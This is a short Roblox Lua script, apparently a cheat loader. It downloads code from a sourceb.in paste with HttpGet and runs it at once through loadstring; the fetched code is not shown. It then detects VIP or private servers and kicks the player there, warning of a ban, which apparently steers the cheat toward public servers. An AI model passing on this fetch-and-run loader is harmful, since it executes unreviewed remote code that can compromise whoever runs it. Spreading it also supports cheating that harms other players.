loadstring(game:HttpGet("https://cdn.sourceb.in/bins/MyWZ0aDph8/0"))()

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()== "VIPServer" then
    game:GetService("Players").LocalPlayer:Kick("VIP / Private Server detected.\nUsing this script in this server may result in a ban.\nPlease join a PUBLIC server.")
    return
end
